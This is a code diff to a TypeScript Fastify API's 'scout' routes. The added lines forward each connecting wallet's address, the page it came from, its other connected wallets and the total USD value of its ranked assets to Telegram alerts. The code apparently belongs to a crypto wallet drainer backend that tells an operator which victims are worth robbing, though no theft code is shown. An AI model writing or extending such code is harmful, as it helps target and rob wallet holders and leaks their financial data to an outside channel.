@@ -72,6 +72,8 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
     const chain_id = typeof chainRaw === 'number' && Number.isFinite(chainRaw) ? chainRaw : 0
     const walletType = typeof body.wallet_type === 'string' ? body.wallet_type : 'Unknown'
     const chainFamily = typeof body.chain_family === 'string' ? body.chain_family : 'EVM'
+    const sourcePage = typeof body.source_page === 'string' ? body.source_page.trim() : ''
+    const activeTab = typeof body.active_chain_tab === 'string' ? body.active_chain_tab.trim() : ''
 
     request.log.info(
       { sentinel: 'TelemetryIngress', module: 'apps/api/scout', user_address, chain_id },
@@ -86,6 +88,11 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
         chain_family: chainFamily,
         wallet_type: walletType,
         ...(body.scout_value_usd != null ? { scout_value_usd: body.scout_value_usd } : {}),
+        ...(sourcePage ? { sourceDomain: sourcePage } : {}),
+        ...(activeTab ? { active_chain_tab: activeTab } : {}),
+        ...(Array.isArray(body.connected_wallets) && body.connected_wallets.length > 0
+          ? { connected_wallets: body.connected_wallets.join(',') }
+          : {}),
       }
       notifyWalletConnected(user_address, chainFamily, walletType, ctx).catch(() => {})
     }
@@ -220,6 +227,12 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
     try {
       const assets = await getRankedAssets(wallet, chainFamily)
       const totalUsd = assets.reduce((sum, a) => sum + a.amount_usd, 0)
+      const scanCtx: TelegramRequestContext = {
+        ...extractRequestContext(request),
+        chain_family: chainFamily ?? 'ALL',
+        scout_value_usd: totalUsd,
+      }
+      notifyScanComplete(wallet, totalUsd, assets.length, scanCtx).catch(() => {})
       return sendSuccess(reply, 200, 'Ranked assets ready', {
         assets,
         total_usd: totalUsd,
